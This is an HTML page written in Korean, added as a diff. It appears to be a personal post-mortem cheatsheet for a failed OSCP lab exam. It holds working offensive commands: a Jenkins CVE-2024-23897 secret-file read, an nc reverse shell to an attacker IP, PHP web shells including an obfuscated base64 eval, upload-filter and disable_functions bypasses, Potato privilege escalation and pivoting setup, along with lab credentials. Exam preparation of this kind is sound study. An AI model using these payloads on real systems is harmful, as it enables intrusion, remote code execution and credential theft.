@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP Cheatsheet - 취약점 & 교훈</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+KR:wght@300;400;700&display=swap');
+
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #1c2128;
+    --border: #30363d;
+    --red: #ff4444;
+    --orange: #ff8c00;
+    --green: #39d353;
+    --blue: #58a6ff;
+    --purple: #bc8cff;
+    --yellow: #e3b341;
+    --text: #e6edf3;
+    --muted: #7d8590;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Noto Sans KR', sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    padding: 40px 20px;
+  }
+
+  .container { max-width: 1100px; margin: 0 auto; }
+
+  header {
+    border-left: 4px solid var(--red);
+    padding: 16px 24px;
+    margin-bottom: 40px;
+    background: var(--surface);
+    border-radius: 0 8px 8px 0;
+  }
+
+  header h1 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 22px;
+    color: var(--red);
+    letter-spacing: 2px;
+  }
+
+  header p {
+    color: var(--muted);
+    font-size: 13px;
+    margin-top: 4px;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+
+  .card.full { grid-column: 1 / -1; }
+
+  .card-header {
+    padding: 12px 18px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .card-header .icon { font-size: 16px; }
+
+  .card-header h2 {
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .tag {
+    margin-left: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 20px;
+    border: 1px solid;
+  }
+
+  .tag.fail { color: var(--red); border-color: var(--red); background: rgba(255,68,68,0.1); }
+  .tag.warn { color: var(--orange); border-color: var(--orange); background: rgba(255,140,0,0.1); }
+  .tag.ok   { color: var(--green); border-color: var(--green); background: rgba(57,211,83,0.1); }
+
+  .card-body { padding: 16px 18px; }
+
+  .lesson {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px 14px;
+    margin-bottom: 12px;
+  }
+
+  .lesson:last-child { margin-bottom: 0; }
+
+  .lesson-title {
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }
+
+  .lesson p {
+    font-size: 13px;
+    color: var(--text);
+    margin-bottom: 8px;
+  }
+
+  .lesson p:last-child { margin-bottom: 0; }
+
+  .bad {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    background: rgba(255,68,68,0.08);
+    border: 1px solid rgba(255,68,68,0.3);
+    border-radius: 4px;
+    padding: 8px 12px;
+    color: var(--red);
+    margin-bottom: 6px;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .good {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    background: rgba(57,211,83,0.06);
+    border: 1px solid rgba(57,211,83,0.25);
+    border-radius: 4px;
+    padding: 8px 12px;
+    color: var(--green);
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .info {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    background: rgba(88,166,255,0.06);
+    border: 1px solid rgba(88,166,255,0.25);
+    border-radius: 4px;
+    padding: 8px 12px;
+    color: var(--blue);
+    white-space: pre-wrap;
+    word-break: break-all;
+    margin-bottom: 6px;
+  }
+
+  .warn-box {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    background: rgba(255,140,0,0.06);
+    border: 1px solid rgba(255,140,0,0.25);
+    border-radius: 4px;
+    padding: 8px 12px;
+    color: var(--orange);
+    white-space: pre-wrap;
+    word-break: break-all;
+    margin-bottom: 6px;
+  }
+
+  .arrow {
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    text-align: center;
+    padding: 4px 0;
+  }
+
+  .score-bar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+
+  .score-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--muted);
+    width: 140px;
+    flex-shrink: 0;
+  }
+
+  .score-track {
+    flex: 1;
+    height: 8px;
+    background: var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  .score-fill {
+    height: 100%;
+    border-radius: 4px;
+  }
+
+  .score-val {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    width: 50px;
+    text-align: right;
+  }
+
+  .checklist { list-style: none; }
+  .checklist li {
+    font-size: 13px;
+    padding: 6px 0;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+  }
+  .checklist li:last-child { border-bottom: none; }
+  .checklist .dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    margin-top: 6px;
+    flex-shrink: 0;
+  }
+  .dot.red { background: var(--red); }
+  .dot.orange { background: var(--orange); }
+  .dot.green { background: var(--green); }
+  .dot.blue { background: var(--blue); }
+
+  .divider {
+    height: 1px;
+    background: var(--border);
+    margin: 12px 0;
+  }
+
+  .small { font-size: 12px; color: var(--muted); }
+
+  footer {
+    margin-top: 40px;
+    text-align: center;
+    color: var(--muted);
+    font-size: 12px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <h1>// OSCP CHEATSHEET</h1>
+    <p>2026.03.21 시험 분석 — 실패 원인 & 다음을 위한 교훈</p>
+  </header>
+
+  <!-- 점수 현황 -->
+  <div class="card full" style="margin-bottom:20px;">
+    <div class="card-header">
+      <span class="icon">📊</span>
+      <h2 style="color:var(--yellow)">시험 결과</h2>
+      <span class="tag fail">20 / 70 FAIL</span>
+    </div>
+    <div class="card-body">
+      <div class="score-bar">
+        <span class="score-label">.110 (독립)</span>
+        <div class="score-track"><div class="score-fill" style="width:0%;background:var(--red)"></div></div>
+        <span class="score-val" style="color:var(--red)">0 / 20</span>
+      </div>
+      <div class="score-bar">
+        <span class="score-label">.111 (독립)</span>
+        <div class="score-track"><div class="score-fill" style="width:50%;background:var(--orange)"></div></div>
+        <span class="score-val" style="color:var(--orange)">10 / 20</span>
+      </div>
+      <div class="score-bar">
+        <span class="score-label">.112 (독립)</span>
+        <div class="score-track"><div class="score-fill" style="width:0%;background:var(--red)"></div></div>
+        <span class="score-val" style="color:var(--red)">0 / 20</span>
+      </div>
+      <div class="score-bar">
+        <span class="score-label">AD WS26</span>
+        <div class="score-track"><div class="score-fill" style="width:50%;background:var(--orange)"></div></div>
+        <span class="score-val" style="color:var(--orange)">10 / 40</span>
+      </div>
+      <div class="score-bar">
+        <span class="score-label">AD SRV22 + DC20</span>
+        <div class="score-track"><div class="score-fill" style="width:0%;background:var(--red)"></div></div>
+        <span class="score-val" style="color:var(--red)">0 / 30</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="grid">
+
+    <!-- Jenkins CLI -->
+    <div class="card full">
+      <div class="card-header">
+        <span class="icon">☕</span>
+        <h2 style="color:var(--orange)">Jenkins CLI — CVE-2024-23897</h2>
+        <span class="tag fail">SRV22 핵심 실패</span>
+      </div>
+      <div class="card-body">
+        <div class="lesson">
+          <div class="lesson-title">❌ 오타 — jarfile 접근 불가</div>
+          <div class="bad">java -jar jekins-cli.jar ...
+→ Error: Unable to access jarfile jekins-cli.jar</div>
+          <div class="good">java -jar jenkins-cli.jar ...
+# TAB 자동완성 습관화!</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">❌ -auth 옵션 누락 — anonymous 권한 에러</div>
+          <div class="bad">java -jar jenkins-cli.jar -s http://localhost:8080/ help "@file"
+→ ERROR: anonymous is missing the Overall/Read permission</div>
+          <div class="good">java -jar jenkins-cli.jar -s http://localhost:8080/ \
+  -auth b.martin:MartiniAllNight222 \
+  connect-node "@C:\Program Files\Jenkins\secrets\master.key"</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">❌ 경로 공백 처리 누락</div>
+          <div class="bad">... help 1 "@c:\program files\jenkins\secrets\master.key"
+→ ERROR: Too many arguments</div>
+          <div class="good">... connect-node "@\"C:\Program Files\Jenkins\secrets\master.key\""</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ CVE-2024-23897 올바른 순서</div>
+          <div class="warn-box"># ⚠️ Evil-WinRM에서 TAB 자동완성 안됨
+# → ls로 파일명 확인 후 복붙, 또는 짧게 rename
+cp jenkins-cli.jar j.jar</div>
+          <div class="warn-box"># ⚠️ 경로에 공백(Program Files) 있으면 따옴표 안에 넣어도 에러남
+# → 공백 없는 경로 우선 시도
+@C:\ProgramData\Jenkins\.jenkins\secrets\master.key
+@C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret
+@C:\ProgramData\Jenkins\.jenkins\users\users.xml</div>
+          <div class="info"># 공백 없는 경로로 시도
+java -jar j.jar -s http://localhost:8080 -auth USER:PASS \
+  connect-node "@C:\ProgramData\Jenkins\.jenkins\secrets\master.key"
+
+# 공백 있는 경로는 8.3 단축경로 사용
+# "C:\Program Files" → "C:\Progra~1"
+java -jar j.jar -s http://localhost:8080 -auth USER:PASS \
+  connect-node "@C:\Progra~1\Jenkins\secrets\master.key"</div>
+          <div class="small">※ Jenkins 2.441 미만에서 동작 / 브라우저로 /script 콘솔 접근도 시도</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Windows PrivEsc -->
+    <div class="card">
+      <div class="card-header">
+        <span class="icon">🪟</span>
+        <h2 style="color:var(--purple)">Windows PrivEsc</h2>
+        <span class="tag warn">.111 proof.txt 미획득</span>
+      </div>
+      <div class="card-body">
+        <div class="lesson">
+          <div class="lesson-title">❌ WinPEAS .exe 미실행</div>
+          <p>winPEAS.ps1 (PowerShell) 대신 <strong>winPEASx64.exe</strong> 를 써야 서비스 권한, 예약작업, 레지스트리 취약점까지 다 잡힘</p>
+          <div class="good">*Evil-WinRM* PS> upload winPEASx64.exe
+*Evil-WinRM* PS> .\winPEASx64.exe</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ SeImpersonatePrivilege 확인 시 즉시 Potato</div>
+          <div class="info">whoami /priv | findstr Impersonate
+→ Enabled → GodPotato / PrintSpoofer / SweetPotato 즉시 시도</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ PrivEsc 체크리스트</div>
+          <ul class="checklist">
+            <li><span class="dot green"></span>winPEASx64.exe 실행</li>
+            <li><span class="dot green"></span>whoami /priv — Potato류 권한 확인</li>
+            <li><span class="dot green"></span>서비스 권한: Get-WmiObject win32_service</li>
+            <li><span class="dot green"></span>예약작업: schtasks /query /fo LIST /v</li>
+            <li><span class="dot green"></span>크리덴셜 파일: findstr /si password *.xml *.config</li>
+            <li><span class="dot green"></span>PowerUp.ps1: Invoke-AllChecks</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- 파일 업로드 우회 -->
+    <div class="card">
+      <div class="card-header">
+        <span class="icon">📤</span>
+        <h2 style="color:var(--blue)">파일 업로드 필터 우회</h2>
+        <span class="tag fail">.112 미완</span>
+      </div>
+      <div class="card-body">
+        <div class="lesson">
+          <div class="lesson-title">❌ socket_create 에러 = PHP socket 비활성화</div>
+          <p>msfvenom PHP 리버스쉘은 socket 함수 필요 → 비활성화 시 실패</p>
+          <div class="good"># 대신 proc_open / exec 기반 사용
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ 확장자 우회 순서</div>
+          <div class="info">.php → .php3 .php4 .php5 .phtml .pHp .PHP
+→ .htaccess 업로드 (AddType application/x-httpd-php .pdf)
+→ GIF 매직바이트: GIF89a; + PHP 코드
+→ Burp: Content-Type을 image/jpeg 으로 변조</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ 업로드 성공 후 제일 먼저 — phpinfo</div>
+          <p>phpinfo()는 disable_functions로 거의 안 막힘. 서버 설정 파악이 최우선</p>
+          <div class="good">&lt;?php phpinfo(); ?&gt;</div>
+          <div class="info"># phpinfo에서 확인할 것
+- disable_functions 목록
+- PHP 버전
+- open_basedir 제한
+- 활성화된 모듈 (imap, expect 등)</div>
+          <div class="small">※ phpinfo도 빈화면이면 → &lt;?php echo "test"; ?&gt; 로 PHP 파싱 여부 먼저 확인</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">❌ 빈화면 = disable_functions 로 함수 차단</div>
+          <p>주석만 출력되고 코드 실행 결과가 없으면 PHP는 파싱되지만 함수가 막힌 것</p>
+          <div class="info"># 활성화된 함수 확인
+&lt;?php
+$funcs = ['system','exec','passthru','shell_exec','popen','proc_open'];
+foreach($funcs as $f){
+    echo $f.': '.(function_exists($f) ? 'OK' : 'DISABLED').'&lt;br&gt;';
+}
+?&gt;</div>
+          <div class="good"># 함수 우선순위
+system() → exec() → passthru() → shell_exec() → popen()
+
+&lt;?php passthru($_GET['cmd']); ?&gt;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+&lt;?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h); ?&gt;</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">❌ 모든 함수 막혔을 때 — disable_functions 우회</div>
+          <div class="info"># PHP 태그 변형 시도
+&lt;?= system($_GET['cmd']); ?&gt;
+&lt;script language="php"&gt;system($_GET['cmd']);&lt;/script&gt;
+
+# 난독화
+&lt;?php $f='sys'.'tem'; $f($_GET['cmd']); ?&gt;
+&lt;?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?&gt;
+
+# LD_PRELOAD 우회 (putenv + mail)
+&lt;?php putenv('LD_PRELOAD=/var/www/uploads/bypass.so'); mail('','','',''); ?&gt;</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 피벗팅 & 포트포워딩 -->
+    <div class="card">
+      <div class="card-header">
+        <span class="icon">🔀</span>
+        <h2 style="color:var(--green)">Ligolo-ng 피벗팅</h2>
+        <span class="tag ok">잘 사용함</span>
+      </div>
+      <div class="card-body">
+        <div class="lesson">
+          <div class="lesson-title">✅ 기본 터널 세팅</div>
+          <div class="info"># Kali
+sudo ./proxy -selfcert
+
+# Agent (타겟)
+.\agent.exe -connect KALI_IP:11601 -ignore-cert
+
+# ligolo 콘솔
+session → ifcreate --name tun1
+route_add --name tun1 --route 172.16.91.0/24
+start --tun tun1</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ 로컬 포트 포워딩 (내부망 웹서비스 접근)</div>
+          <div class="info"># 타겟의 localhost:8080 → Kali 8888로 포워딩
+listener_add --addr 0.0.0.0:8888 --to 172.16.91.202:8080 --tcp
+
+# Kali 브라우저에서 접근
+http://127.0.0.1:8888</div>
+          <div class="small">※ wget/curl 403이어도 브라우저로 로그인 페이지 확인 가능</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 열거 & 정보수집 -->
+    <div class="card">
+      <div class="card-header">
+        <span class="icon">🔍</span>
+        <h2 style="color:var(--yellow)">열거 & 정보수집</h2>
+        <span class="tag warn">개선 필요</span>
+      </div>
+      <div class="card-body">
+        <div class="lesson">
+          <div class="lesson-title">✅ 웹 디렉토리 탐색 — 빈 페이지도 포기 금지</div>
+          <div class="info">feroxbuster -u http://TARGET \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,html,bak,zip,asp,aspx</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ SMB 익명/guest 접근 항상 확인</div>
+          <div class="info">smbclient -L TARGET -N
+smbclient //TARGET/SHARE -U guest</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ 이메일/파일에서 크리덴셜 추출</div>
+          <div class="info">grep -ri 'passw'
+grep -ri 'password\|passwd\|pwd\|secret\|key'</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ 서비스 실행 계정 확인</div>
+          <div class="info">Get-WmiObject win32_service | Where {$_.Name -like "*jenkins*"} | Select Name, StartName
+# LocalSystem이면 RCE → 바로 SYSTEM</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- AD 공격 -->
+    <div class="card">
+      <div class="card-header">
+        <span class="icon">🏰</span>
+        <h2 style="color:var(--red)">Active Directory</h2>
+        <span class="tag warn">SRV22→DC 미완</span>
+      </div>
+      <div class="card-body">
+        <div class="lesson">
+          <div class="lesson-title">✅ WS26 공격 체인 (성공)</div>
+          <div class="info">r.andrews:BusyOfficeWorker890
+→ Evil-WinRM → SeImpersonatePrivilege
+→ GodPotato → 유저생성 → Administrators 추가
+→ proof.txt ✅ → backup.zip → b.martin:MartiniAllNight222</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">❌ SRV22 — Jenkins 미완</div>
+          <div class="good"># 올바른 공격 체인
+b.martin:MartiniAllNight222 → Evil-WinRM
+→ jenkins-cli -auth → CVE-2024-23897 파일읽기
+→ /script Groovy 콘솔 RCE
+→ SYSTEM → proof.txt
+→ SAM 덤프 → DC 공격</div>
+        </div>
+        <div class="lesson">
+          <div class="lesson-title">✅ Kerberos 시간 동기화 필수</div>
+          <div class="info">sudo rdate -n DC_IP
+# Kerberos는 시간차 5분 이상이면 인증 실패</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- 멘탈 & 시간관리 -->
+    <div class="card full">
+      <div class="card-header">
+        <span class="icon">🧠</span>
+        <h2 style="color:var(--muted)">시험 전략 & 멘탈</h2>
+      </div>
+      <div class="card-body">
+        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;">
+          <div class="lesson">
+            <div class="lesson-title">오타 방지</div>
+            <p>명령어 입력 시 TAB 자동완성 필수. 특히 jar파일명, 경로, 옵션명</p>
+          </div>
+          <div class="lesson">
+            <div class="lesson-title">에러 메시지 정독</div>
+            <p>anonymous 에러 → <strong>-auth 추가</strong><br>Too many arguments → <strong>공백 경로 따옴표</strong><br>Unable to access jarfile → <strong>오타 확인</strong></p>
+          </div>
+          <div class="lesson">
+            <div class="lesson-title">포기 타이밍</div>
+            <p>같은 에러가 반복되면 옵션 하나씩 바꿔보기. 권한 에러 ≠ 불가능, 인증 문제일 수 있음</p>
+          </div>
+          <div class="lesson">
+            <div class="lesson-title">브라우저 활용</div>
+            <p>curl/wget 403이어도 브라우저 + ligolo 포트포워딩으로 로그인 페이지 확인</p>
+          </div>
+          <div class="lesson">
+            <div class="lesson-title">AD 우선 공략</div>
+            <p>AD 40점 = 독립머신 2대. 초반에 AD 진입 후 독립머신 교차 진행 권장</p>
+          </div>
+          <div class="lesson">
+            <div class="lesson-title">스크린샷 타이밍</div>
+            <p>flag 획득 즉시 <strong>ipconfig + type flag</strong> 같이 캡처. 나중에 증명 불가</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <footer>
+    // OSCP EXAM REVIEW — 2026.03.21 &nbsp;|&nbsp; 다음엔 반드시 합격 💪
+  </footer>
+
+</div>
+</body>
+</html>
